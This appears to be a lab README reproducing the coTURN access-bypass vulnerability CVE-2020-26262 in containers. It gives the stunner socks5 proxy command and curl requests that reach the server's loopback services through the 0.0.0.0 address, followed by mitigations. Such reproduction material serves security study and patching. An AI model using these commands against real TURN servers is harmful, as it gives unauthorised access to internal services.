# Access Bypass
- Vulnerable component: coTURN server
- Affected version: 4.5.1.x
- CVE ID: [CVE-2020-26262](https://nvd.nist.gov/vuln/detail/CVE-2020-26262)

## Description
In this scenario, after creating a socks5 proxy to the TURN server, it is possible using specific HTTP GET requests to access the loopback interface of the server.

## How to reproduce the issue
As a first step, the containers are started with:
```bash
docker compose up -d --build
```
The behavior of the <i>coTURN</i> server is observed with:
```bash
docker logs coturn --follow
```

Access the <i>stunner</i> container:
```bash
docker exec -it stunner sh
```
and create a socks5 proxy with:
```bash
stunner socks --turnserver 203.0.113.10:3478 --protocol tcp --username username1 --password password1 --listen 203.0.113.4:9999
```
This command creates a `socks5` server connected to the TURN server (`turnserver`). It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `203.0.113.4:9999`.

A web server is created on the coTURN container on the loopback interface:
```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

By performing a GET request to the server on the loopback interface through the proxy:
```
curl -x socks5h://203.0.113.4:9999 http://127.0.0.1:8000
```
the request is blocked (coTURN blocks requests toward loopback addresses). However, by using the IP `0.0.0.0`, a communication can be established and the web services become accessible:
```
curl -x socks5h://203.0.113.4:9999 http://0.0.0.0:8000
```
## Mitigations
- Update to patched version.
- In the server configuration file, insert the following line: ```denied-peer-ip=0.0.0.0-0.255.255.255```. In this way is possible to block the address of the ```0.0.0.0/8``` network.


## Credits
This vulnerability was discovered by [Enable Security](https://www.enablesecurity.com/)